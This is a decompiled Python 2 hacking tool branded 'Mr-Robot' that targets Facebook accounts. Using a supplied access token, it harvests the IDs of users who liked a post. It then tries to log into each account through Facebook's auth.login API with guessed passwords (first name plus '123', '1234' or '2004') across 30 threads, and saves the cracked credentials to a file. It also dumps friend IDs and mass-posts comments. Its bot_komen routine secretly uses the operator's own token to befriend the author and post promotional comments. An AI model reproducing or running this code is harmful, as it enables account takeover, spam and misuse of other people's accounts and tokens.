# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.17 (default, Dec  5 2019, 10:45:36) 
# [GCC 4.2.1 Compatible Android (5220042 based on r346389c) Clang 8.0.7 (https://
# Embedded file name: <Ahmad_Riswanto>
import os, socket, sys, pyfiglet, time, mechanize, itertools, datetime, random, hashlib, re, threading, json, getpass, urllib, cookielib
from multiprocessing.pool import ThreadPool
from urllib2 import *
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')

try:
    import requests
except ImportError:
    os.system('pip2 install requests')
    os.system('python2 Love.py')

from requests.exceptions import ConnectionError
from mechanize import Browser
from datetime import datetime
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
os.system('clear')

def kaluar():
    sys.exit('\x1b[37;1m[\x1b[31;1m!\x1b[37;1m] \x1b[37;1mExit Program')


def ngetik(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)

def banner():
    print('\033[34;1m')
    logo = pyfiglet.figlet_format('Mr-Robot')
    print(logo)
    print('\t\033[37;1m[\033[41;1m FACEBOOK ACCOUNT CLONING \033[00;1m\033[37;1m ]\n')
    print('\033[32;1mCreator \033[37;1m: \033[33;1mSayyed-Zakarya')
    print('\033[32;1mVersion \033[37;1m: \033[33;1m1.0')


back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
oke = []
id = []
idteman = []

def subs():
    os.system('clear')
    print logo
    print 'Opens Facebook'
    time.sleep(1)
    os.system('xdg-open https://www.facebook.com/sayyed.302/')
    masuk()


def masuk():
    os.system('clear')
    print logo
    print '\x1b[41;1m select a number:\x1b[00;1m'
    print '\x1b[31;1m[\x1b[33;1m+\x1b[31;1m]' + 30 * '\x1b[33;1m=' + '\x1b[31;1m[\x1b[33;1m+\x1b[31;1m]'
    print '\x1b[37;1m[\x1b[32;1m01\x1b[37;1m] \x1b[34;1mlogin using token'
    print '\x1b[37;1m[\x1b[32;1m02\x1b[37;1m] \x1b[34;1mtutorial for token'
    print '\x1b[37;1m[\x1b[32;1m03\x1b[37;1m] \x1b[34;1mupdate tools'
    print '\x1b[37;1m[\x1b[32;1m04\x1b[37;1m] \x1b[34;1mfollow fp'
    print '\x1b[37;1m[\x1b[31;1m00\x1b[37;1m] \x1b[34;1mexit'
    print '\x1b[31;1m[\x1b[33;1m+\x1b[31;1m]' + 30 * '\x1b[33;1m=' + '\x1b[31;1m[\x1b[33;1m+\x1b[31;1m]'
    asup()


def kk():
    os.system('clear')
    print logo
    print 'How to Get a Post ID'
    print '1.Look for Public Posts with Lots of Likes'
    print '2.Click Colon In The Corner Then Click Copy Link'
    print '3.If so, then there is a link as follows'
    print 'https://www.facebook.com/100009563131835/posts/2784729071855837/?app=fbl'
    print '4.Then Copy The Number In The Second Row As Above'
    print '5.And Paste In Public ID Crack'
    halo = raw_input('[Enter To Exit]')
    if halo == '':
        menu()
    else:
        print 'Enter To Exit'
        time.sleep(1)
        kk()


def asup():
    milih = raw_input('\x1b[32;1mSelect\x1b[37;1m#\x1b[34;1mmenu\x1b[32;1m~  \x1b[37;1m')
    if milih == '':
        print (' Don't be Empty')
        time.sleep(2)
        masuk()
    elif milih == '1' or milih == '01':
        token()
    elif milih == '2' or milih == '02':
        tutor()
    elif milih == '3' or milih == '03':
        update()
    elif milih == '4' or milih == '04':
        subs()
    elif milih == '0' or milih == '00':
        keluar()
        os.system('clear')
    else:
        print '\x1b[37;1m{\x1b[31;1m!\x1b[37;1m} nomor ' + milih + ' tidak ada'
        time.sleep(1)
        masuk()


def token():
    os.system('clear')
    print logo
    toke = raw_input('\x1b[37;1m[\x1b[32;1m*\x1b[37;1m] \x1b[34;1minput token\x1b[33;1m: \x1b[37;1m')
    if toke == '':
        print 'Past Token Fb'
        time.sleep(1)
        token()
    try:
        gas = requests.get('https://graph.facebook.com/me?access_token=' + toke)
        a = json.loads(gas.text)
        nyimpen = open('login.txt', 'w')
        nyimpen.write(toke)
        nyimpen.close()
        print 'Sucessfully Login'
        bot_komen()
    except KeyError:
        print 'Token Wrong'
        time.sleep(1.7)
        masuk()


def update():
    os.system('clear')
    print logo
    print '\x1b[41;1m Updating Script\x1b[00;1m'
    time.sleep(1)
    os.system('git pull')
    print '\x1b[41;1m Updated successfully\x1b[00;1m'
    time.sleep(2)
    masuk()


def update1():
    os.system('clear')
    print logo
    print '\x1b[41;1m Updating Script\x1b[00;1m'
    time.sleep(1)
    os.system('git pull')
    print '\x1b[41;1m Updated successfully\x1b[00;1m'
    time.sleep(2)
    menu()


def tutor():
    os.system('clear')
    print logo
    print '\x1b[41;1m Tips for Getting Tokens Without Cp!!!\x1b[00;1m'
    print '\x1b[41;1m Go to Chrome and type www.facebook.com and log in to your account\x1b[00;1m'
    print '\x1b[41;1m Then Create a New Tab Paste the following link\x1b[00;1m'
    print '\x1b[41;1m https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_\x1b[00;1m'
    print '\x1b[41;1m If you have clicked the three dots above the right side then find the page on the page \x1b[00;1m'
    print '\x1b[41;1m And Search Type EAAA And You Will See The Access Token\x1b[00;1m'
    print '\x1b[41;1m Copy Then Paste In This Login an Tools ^_^\x1b[00;1m'
    print '1.To Watch Video Tutorials'
    print '2.To get out of'
    cuk = raw_input('Chose: ')
    if cuk == '1' or cuk == '01':
        print 'Opens Youtube'
        time.sleep(1)
        os.system('xdg-open https://www.youtube.com/channel/UCzCZ1fHCMM6xjSfQOZFEmqg')
        masuk()
    elif cuk == '2' or cuk == '02':
        masuk()
    else:
        print 'gada Number That'
        time.sleep(1)
        tutor()


def bot_komen():
    try:
        toke = open('login.txt', 'r').read()
    except IOError:
        print '[!] Login Failed'
        os.system('rm -rf login.txt')

    una = '100045781089477'
    kom = 'Hai Bang'
    kom2 = 'Wadooo Bang Jago'
    kom3 = 'Script nya work gan'
    kom4 = 'heker banget\xf0\x9f\x99\x8f'
    kom5 = 'rahimku anget'
    kom6 = 'gan kamu ganteng'
    kom7 = 'hai gan'
    kom8 = 'duh bang sc nya work bener gw dapet banyak akun'
    kom9 = 'p'
    reac = 'ANGRY'
    post = '194234645445904'
    requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + una + '&access_token=' + toke)
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + toke)
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom2 + '&access_token=' + toke)
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom3 + '&access_token=' + toke)
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom4 + '&access_token=' + toke)
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom5 + '&access_token=' + toke)
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom6 + '&access_token=' + toke)
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom7 + '&access_token=' + toke)
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom8 + '&access_token=' + toke)
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom9 + '&access_token=' + toke)
    requests.post('https://graph.facebook.com/' + post + '/reactions?type=' + reac + '&access_token=' + toke)
    menu()


def donasi():
    os.system('clear')
    print logo
    print 'Opens Chrome'
    time.sleep(1)
    os.system('xdg-open https://www.facebook.com/sayyed.302/')
    menu()


def menu():
    os.system('clear')
    try:
        toke = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[37;1m{\x1b[31;1m!\x1b[37;1m} Token Wrong'
        os.system('clear')
        os.system('rm -rf login.txt')
        masuk()

    try:
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + toke)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print '\x1b[1;96m[!] \x1b[1;91mToken Wrong'
        os.system('rm -rf login.txt')
        time.sleep(1)
        masuk()
        time.sleep(1)
        masuk()
    except requests.exceptions.ConnectionError:
        print '\x1b[37;1m{\x1b[31;1m!\x1b[37;1m} \x1b[34;1mConnection Error'
        kaluar()

    os.system('clear')
    print logo
    print '\x1b[41;1m Always Update Your Script So You Can Update:)\x1b[00;1m'
    print '\x1b[31;1m[\x1b[33;1m+\x1b[31;1m]' + 40 * '\x1b[33;1m\xe2\x94\x80' + '\x1b[31;1m[\x1b[33;1m+\x1b[31;1m]'
    print '\x1b[37;1m{\x1b[31;1m!\x1b[37;1m} \x1b[34;1mYOUR IDENTITY'
    print '\x1b[1;97m{\x1b[1;96m\xe2\x80\xa2\x1b[1;97m}\x1b[1;95m YOUR NAME\x1b[1;90m  =\x1b[1;92m ' + nama
    print '\x1b[1;97m{\x1b[1;96m\xe2\x80\xa2\x1b[1;97m}\x1b[1;95m USER ID\x1b[1;90m =\x1b[1;92m ' + id
    print '\x1b[31;1m[\x1b[33;1m+\x1b[31;1m]' + 40 * '\x1b[33;1m\xe2\x94\x80' + '\x1b[31;1m[\x1b[33;1m+\x1b[31;1m]'
    print '\x1b[37;1m{\x1b[31;1m!\x1b[37;1m} \x1b[34;1m         **TOOLS FACEBOOK**'
    print '\x1b[37;1m[\x1b[32;1m01\x1b[37;1m] \x1b[34;1mCrack ID Post Public'
    print '\x1b[37;1m[\x1b[32;1m02\x1b[37;1m] \x1b[34;1mDump ID Friend'
    print '\x1b[37;1m[\x1b[32;1m03\x1b[37;1m] \x1b[34;1mSpam Comment'
    print '\x1b[31;1m[\x1b[33;1m+\x1b[31;1m]' + 40 * '\x1b[33;1m\xe2\x94\x80' + '\x1b[31;1m[\x1b[33;1m+\x1b[31;1m]'
    print '\x1b[37;1m{\x1b[31;1m!\x1b[37;1m} \x1b[34;1m            **OTHER**'
    print '\x1b[37;1m[\x1b[32;1m04\x1b[37;1m] \x1b[34;1mHow to Get Post ID'
    print '\x1b[37;1m[\x1b[32;1m05\x1b[37;1m] \x1b[34;1mDonate to Mr-Robot'
    print '\x1b[37;1m[\x1b[32;1m06\x1b[37;1m] \x1b[34;1mUpdate Script'
    print '\x1b[37;1m[\x1b[32;1m07\x1b[37;1m] \x1b[34;1mReport Bug'
    print '\x1b[37;1m[\x1b[31;1m00\x1b[37;1m] \x1b[31;1mLogout'
    print '\x1b[31;1m[\x1b[33;1m+\x1b[31;1m]' + 40 * '\x1b[33;1m\xe2\x94\x80' + '\x1b[31;1m[\x1b[33;1m+\x1b[31;1m]'
    pilih()


def pilih():
    gokil = raw_input('\x1b[32;1mmenu\x1b[37;1m@\x1b[34;1mterminal\x1b[32;1m~#  \x1b[37;1m')
    if gokil == '':
        print '\x1b[37;1m{\x1b[31;1m!\x1b[37;1m} Please enter a number'
        pilih()
    elif gokil == '1' or gokil == '01':
        crack_post()
    elif gokil == '2' or gokil == '02':
        dumpid()
    elif gokil == '3' or gokil == '03':
        spamkomen()
    elif gokil == '4' or gokil == '04':
        kk()
    elif gokil == '5' or gokil == '05':
        donasi()
    elif gokil == '6' or gokil == '06':
        update1()
    elif gokil == '7' or gokil == '07':
        report()
    elif gokil == '0' or gokil == '00':
        os.system('clear')
        print 'Delete token'
        os.system('rm -rf login.txt')
        masuk()
    else:
        print '\x1b[37;1m{\x1b[31;1m!\x1b[37;1m} number: ' + gokil + ' not found'
        pilih()


def spamkomen():
    try:
        toke = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[37;1m[\x1b[31;1m!\x1b[37;1m] Token invalid'
        os.system('rm -rf login.txt')
        os.system('python2 Love.py')

    os.system('clear')
    print logo
    print 'If the amount of spam is large, it will take a while'
    post = raw_input('\x1b[32;1mID Post \x1b[34;1m=> \x1b[37;1m')
    kom = raw_input('\x1b[32;1mSentence \x1b[34;1m=> \x1b[37;1m')
    jml = int(input('\x1b[32;1mAmounts \x1b[34;1m=> \x1b[37;1m'))
    print '\x1b[37;1m[\x1b[31;1m*\x1b[37;1m] \x1b[32;1mWait Yes'
    for x in range(jml):
        requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + toke)

    print '\x1b[33;1m[\x1b[31;1m*\x1b[33;1m] \x1b[34;1mSuccess'
    balik = raw_input('\x1b[31;1m[Enter Untuk Keluar]\n')
    menu()


def report():
    os.system('clear')
    print logo
    print 'Can Only One Sentence:)'
    print '\x1b[31;1m[\x1b[33;1m+\x1b[31;1m]' + 40 * '\x1b[33;1m\xe2\x94\x80' + '\x1b[31;1m[\x1b[33;1m+\x1b[31;1m]'
    pesan = raw_input('\x1b[32;1mPesan? \x1b[34;1m: \x1b[37;1m')
    os.system('xdg-open https://wa.me/6288232456646?text=' + pesan)
    print 'Open Whatsapp'
    time.sleep(2)
    menu()


def crack_post():
    os.system('clear')
    try:
        toke = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[37;1m[\x1b[31;1m!\x1b[37;1m] Token invalid'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    try:
        os.system('clear')
        print logo
        print '\x1b[31;1m[\x1b[33;1m+\x1b[31;1m]' + 40 * '\x1b[33;1m\xe2\x94\x80' + '\x1b[31;1m[\x1b[33;1m+\x1b[31;1m]'
        po = raw_input('\x1b[37;1m{\x1b[32;1m*\x1b[37;1m}\x1b[34;1m ID Posts Friend/Public: ')
        print '\x1b[31;1m[\x1b[33;1m+\x1b[31;1m]' + 40 * '\x1b[33;1m\xe2\x94\x80' + '\x1b[31;1m[\x1b[33;1m+\x1b[31;1m]'
        r = requests.get('https://graph.facebook.com/' + po + '/likes?limit=9999999&access_token=' + toke)
        z = json.loads(r.text)
        for i in z['data']:
            id.append(i['id'])

        ngetik('\r\x1b[37;1m{\x1b[32;1m*\x1b[37;1m} Take ID ...')
    except KeyError:
        print '\x1b[37;1m{\x1b[31;1m!\x1b[37;1m} ID Post Invaled !'
        balik = raw_input('\n\x1b[32;1m[Enter To Exit]')
        menu()

    print '\x1b[37;1m{\x1b[32;1m*\x1b[37;1m} Total ID : ' + str(len(id))
    print '\x1b[37;1m{\x1b[32;1m*\x1b[37;1m} CTRL+Z To Stop'

    def main(arg):
        sys.stdout.write(('\r{}').format(datetime.now().strftime('\x1b[1;96m%H\x1b[1;91m:\x1b[1;93m%M\x1b[1;91m:\x1b[1;92m%S')))
        sys.stdout.flush()
        jamet = arg
        try:
            os.mkdir('done')
        except OSError:
            pass

        try:
            an = requests.get('https://graph.facebook.com/' + jamet + '/?access_token=' + toke)
            j = json.loads(an.text)
            list1 = j['first_name'].lower() + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + jamet + '&locale=en_US&password=' + list1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            ko = json.load(data)
            if 'access_token' in ko:
                print ''
                print '\n\n\x1b[37;1m{\x1b[32;1m*\x1b[37;1m} SUCESS:)'
                print '\x1b[37;1m{\x1b[32;1m*\x1b[37;1m} Name      ==> ' + j['name']
                print '\x1b[37;1m{\x1b[32;1m*\x1b[37;1m} User      ==> ' + jamet
                print '\x1b[37;1m{\x1b[32;1m*\x1b[37;1m} Password  ==> ' + list1
                print ''
                oke = open('done/group.txt', 'a')
                oke.write('\n\xe2\x9e\xa0 SUCESS \n\xe2\x9e\xa0 Name     > ' + j['name'] + '\n\xe2\x9e\xa0 User     > ' + jamet + '\n\xe2\x9e\xa0 Password > ' + list1 + '\n')
                oke.close()
                oks.append(jamet)
            elif 'www.facebook.com' in ko['error_msg']:
                print ''
                print '\n\n\x1b[37;1m{\x1b[32;1m*\x1b[37;1m} CHEKPOINT:('
                print '\x1b[37;1m{\x1b[32;1m*\x1b[37;1m} Name      ==> ' + j['name']
                print '\x1b[37;1m{\x1b[32;1m*\x1b[37;1m} User      ==> ' + jamet
                print '\x1b[37;1m{\x1b[32;1m*\x1b[37;1m} Password  ==> ' + list1
                print ''
                cek = open('done/group.txt', 'a')
                cek.write('\n\xe2\x9e\xa0 CHEKPOINT \n\xe2\x9e\xa0 Name     > ' + j['name'] + '\n\xe2\x9e\xa0 User     > ' + jamet + '\n\xe2\x9e\xa0 Password > ' + list1 + '\n')
                cek.close()
                cekpoint.append(jamet)
            else:
                list2 = j['first_name'].lower() + '1234'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + jamet + '&locale=en_US&password=' + list2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                ko = json.load(data)
                if 'access_token' in ko:
                    print ''
                    print '\n\n\x1b[37;1m{\x1b[32;1m*\x1b[37;1m} SUCESS'
                    print '\x1b[37;1m{\x1b[32;1m*\x1b[37;1m} Name      ==> ' + j['name']
                    print '\x1b[37;1m{\x1b[32;1m*\x1b[37;1m} User      ==> ' + jamet
                    print '\x1b[37;1m{\x1b[32;1m*\x1b[37;1m} Password  ==> ' + list2
                    print ''
                    oke = open('done/group.txt', 'a')
                    oke.write('\n\xe2\x9e\xa0 SUCESS \n\xe2\x9e\xa0 Name     > ' + j['name'] + '\n\xe2\x9e\xa0 User     > ' + jamet + '\n\xe2\x9e\xa0 Password > ' + list2 + '\n')
                    oke.close()
                    oks.append(jamet)
                elif 'www.facebook.com' in ko['error_msg']:
                    print ''
                    print '\n\n\x1b[37;1m{\x1b[32;1m*\x1b[37;1m} CHEKPOINT'
                    print '\x1b[37;1m{\x1b[32;1m*\x1b[37;1m} Name      ==> ' + j['name']
                    print '\x1b[37;1m{\x1b[32;1m*\x1b[37;1m} User      ==> ' + jamet
                    print '\x1b[37;1m{\x1b[32;1m*\x1b[37;1m} Password  ==> ' + list2
                    print ''
                    cek = open('done/group.txt', 'a')
                    cek.write('\n\xe2\x9e\xa0 CHEKPOINT \n\xe2\x9e\xa0 Name     > ' + j['name'] + '\n\xe2\x9e\xa0 User     > ' + jamet + '\n\xe2\x9e\xa0 Password > ' + list2 + '\n')
                    cek.close()
                    cekpoint.append(jamet)
                else:
                    list3 = j['first_name'].lower() + '2004'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + jamet + '&locale=en_US&password=' + list3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print ''
                        print '\n\n\x1b[37;1m{\x1b[32;1m*\x1b[37;1m} SUCESS:)'
                        print '\x1b[37;1m{\x1b[32;1m*\x1b[37;1m} Name      ==> ' + j['name']
                        print '\x1b[37;1m{\x1b[32;1m*\x1b[37;1m} User      ==> ' + jamet
                        print '\x1b[37;1m{\x1b[32;1m*\x1b[37;1m} Password  ==> ' + list3
                        print ''
                        oke = open('done/group.txt', 'a')
                        oke.write('\n\xe2\x9e\xa0 SUCESS \n\xe2\x9e\xa0 Name     > ' + j['name'] + '\n\xe2\x9e\xa0 User     > ' + jamet + '\n\xe2\x9e\xa0 Password > ' + list3 + '\n')
                        oke.close()
                        oks.append(jamet)
                    elif 'www.facebook.com' in ko['error_msg']:
                        print ''
                        print '\n\n\x1b[37;1m{\x1b[32;1m*\x1b[37;1m} CHEKPOINT:('
                        print '\x1b[37;1m{\x1b[32;1m*\x1b[37;1m} Name      ==> ' + j['name']
                        print '\x1b[37;1m{\x1b[32;1m*\x1b[37;1m} User      ==> ' + jamet
                        print '\x1b[37;1m{\x1b[32;1m*\x1b[37;1m} Password  ==> ' + list3
                        print ''
                        cek = open('done/group.txt', 'a')
                        cek.write('\n\xe2\x9e\xa0 CHEKPOINT \n\xe2\x9e\xa0 Name     > ' + j['name'] + '\n\xe2\x9e\xa0 User     > ' + jamet + '\n\xe2\x9e\xa0 Password > ' + list3 + '\n')
                        cek.close()
                        cekpoint.append(jamet)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n\x1b[31;1m[\x1b[33;1m+\x1b[31;1m]' + 40 * '\x1b[33;1m\xe2\x94\x80' + '\x1b[31;1m[\x1b[33;1m+\x1b[31;1m]'
    print '\x1b[37;1m{\x1b[32;1m*\x1b[37;1m}Done'
    print '\x1b[37;1m{\x1b[32;1m*\x1b[37;1m}save : done/group.txt'
    print '\x1b[37;1m{\x1b[32;1m*\x1b[37;1m}Checkpoint : ' + str(len(cekpoint))
    print '\x1b[37;1m{\x1b[32;1m*\x1b[37;1m}Sucess     : ' + str(len(oks))
    print '\x1b[31;1m[\x1b[33;1m+\x1b[31;1m]' + 40 * '\x1b[33;1m\xe2\x94\x80' + '\x1b[31;1m[\x1b[33;1m+\x1b[31;1m]'
    balik = raw_input('\n[Enter Untuk Keluar]\n')
    menu()


def dumpid():
    os.system('clear')
    try:
        toke = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[37;1m[\x1b[31;1m!\x1b[37;1m] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        os.system('python2 main.py')

    try:
        os.mkdir('done')
    except OSError:
        pass

    try:
        os.system('clear')
        print logo
        print '\x1b[31;1m[\x1b[33;1m+\x1b[31;1m]' + 40 * '\x1b[33;1m\xe2\x94\x80' + '\x1b[31;1m[\x1b[33;1m+\x1b[31;1m]'
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toke)
        z = json.loads(r.text)
        bz = open('done/id.txt', 'w')
        for a in z['data']:
            idteman.append(a['id'])
            bz.write(a['id'] + '\n')
            print '\r\x1b[34;1m[\x1b[37;1m' + str(len(idteman)) + '\x1b[34;1m] \x1b[32;1m =>',
            sys.stdout.flush()
            time.sleep(0.005)
            print '\x1b[37;1m' + a['id']

        bz.close()
        print '\r\x1b[31;1mTotal ID :\x1b[37;1m %s' % len(idteman)
        simpen = raw_input('\r\x1b[32;1mSave To \x1b[37;1m=> \x1b[33;1mFile Name : \x1b[37;1m')
        os.rename('done/id.txt', 'done/' + simpen)
        print '\r\x1b[32;1mFile Save \x1b[33;1m: \x1b[37;1mdone/' + simpen
        print '\x1b[31;1m[\x1b[33;1m+\x1b[31;1m]' + 40 * '\x1b[33;1m\xe2\x94\x80' + '\x1b[31;1m[\x1b[33;1m+\x1b[31;1m]'
        balik = raw_input('\x1b[31;1m[<back>]')
        os.system('python2 Love.py')
    except IOError:
        print "\x1b[37;1m[\x1b[31;1m!\x1b[37;1m] dont't create file "
        balik = raw_input('\x1b[31;1m[<back>]')
        menu()
    except (KeyboardInterrupt, EOFError):
        print '\x1b[37;1m[\x1b[31;1m!\x1b[37;1m] stop !'
        balik = raw_input('\x1b[31;1m[<back>]')
        menu()
    except KeyError:
        print '\x1b[37;1m[\x1b[31;1m!\x1b[37;1m] Error !'
        raw_input('\x1b[31;1m[<back>]')
        menu()
    except OSError:
        print "\x1b[37;1m[\x1b[31;1m!\x1b[37;1m] Don't save"
        balik = raw_input('\n\x1b[31;1m[<back>]\n')
        os.system('python2 main.py')
    except requests.exceptions.ConnectionError:
        print '\x1b[37;1m[\x1b[31;1m!\x1b[37;1m] Conection Error !'
        menu()


if __name__ == '__main__':
    menu()
    masuk()
